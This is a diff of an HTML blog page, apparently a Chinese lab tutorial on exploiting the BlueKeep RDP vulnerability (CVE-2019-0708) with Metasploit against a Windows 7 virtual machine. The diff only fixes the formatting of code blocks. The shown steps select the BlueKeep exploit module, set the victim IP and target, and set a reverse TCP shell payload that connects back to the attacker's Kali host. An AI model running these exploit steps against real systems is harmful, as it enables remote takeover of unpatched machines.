@@ -293,12 +293,19 @@
 <p>   <img src="/resources/1567961283984.png" alt="1567961283984"></p>
 <ol start="6">
 <li><p>使用这个exp,并查看相关信息</p>
-<figure class="highlight plain"><figcaption><span>exploit/windows/rdp/cve_2019_0708_bluekeep_rce```</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">``` show options</span><br></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/rdp/cve_2019_0708_bluekeep_rce</span><br><span class="line"></span><br><span class="line">show options</span><br><span class="line"></span><br><span class="line">show info</span><br></pre></td></tr></table></figure>
 
-<figure class="highlight plain"><figcaption><span>info```</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">   </span><br><span class="line"></span><br><span class="line">   ![1567961479827](/resources/1567961479827.png)</span><br><span class="line"></span><br><span class="line">7. 设置rhosts ip (其实就是被攻击的ip即win7的)，设置目标系统,目标系统有5个选项，可以根据实际情况来选，我这里的win7 是vm的虚拟机，所以选择3</span><br><span class="line"></span><br><span class="line">   </span><br><span class="line"></span><br><span class="line">   ![1567961784177](/resources/1567961784177.png)</span><br><span class="line"></span><br><span class="line">   </span><br><span class="line"></span><br><span class="line">   ![1567961812168](/resources/1567961812168.png)</span><br><span class="line"></span><br><span class="line">   </span><br><span class="line"></span><br><span class="line">8. 设置payload及LHOST（反弹回连的ip即kali的ip）</span><br><span class="line"></span><br><span class="line">   ```set payload windows/x64/shell/reverse_tcp</span><br></pre></td></tr></table></figure>
-
-
-
+<p><img src="/resources/1567961479827.png" alt="1567961479827"></p>
+</li>
+</ol>
+<ol start="7">
+<li>设置rhosts ip (其实就是被攻击的ip即win7的)，设置目标系统,目标系统有5个选项，可以根据实际情况来选，我这里的win7 是vm的虚拟机，所以选择3</li>
+</ol>
+<p>   <img src="/resources/1567961784177.png" alt="1567961784177"></p>
+<p>   <img src="/resources/1567961812168.png" alt="1567961812168"></p>
+<ol start="8">
+<li><p>设置payload及LHOST（反弹回连的ip即kali的ip）</p>
+<p><code>set payload windows/x64/shell/reverse_tcp</code></p>
 </li>
 </ol>
 <p>   <img src="/resources/1567962053039.png" alt="1567962053039"></p>
